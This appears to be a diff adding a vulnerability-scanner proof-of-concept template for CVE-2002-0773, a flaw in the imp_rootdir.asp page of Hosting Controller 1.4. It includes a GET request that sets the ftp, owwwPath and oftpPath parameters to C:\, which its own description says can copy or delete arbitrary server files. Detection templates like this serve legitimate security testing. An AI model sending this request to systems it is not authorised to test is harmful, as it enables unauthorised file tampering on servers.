@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 Hosting Controller 1.4 的 imp_rootdir.asp 页面是否存在未授权目录遍历/文件操作漏洞。通过直接请求 imp_rootdir.asp 并修改 ftp、owwwPath、oftpPath 参数，可复制或删除服务器上任意文件目录。"
+id = "POC-AVE-2002-0437"
+name = "Hosting Controller 1.4 Import Root Directory Command Execution PoC"
+severity = "critical"
+tags = ["cve-2002-0773"]
+vuln_id = [
+    "CVE-2002-0773",
+    "AVE-2002-0437",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/admin/import/imp_rootdir.asp?result=1&www=C:\&ftp=C:\&owwwPath=C:\&oftpPath=C:\'
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "imp_rootdir",
+    "Import Root Directory",
+    "result",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/admin/import/imp_rootdir.asp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "imp_rootdir",
+    "Import Root Directory",
+]
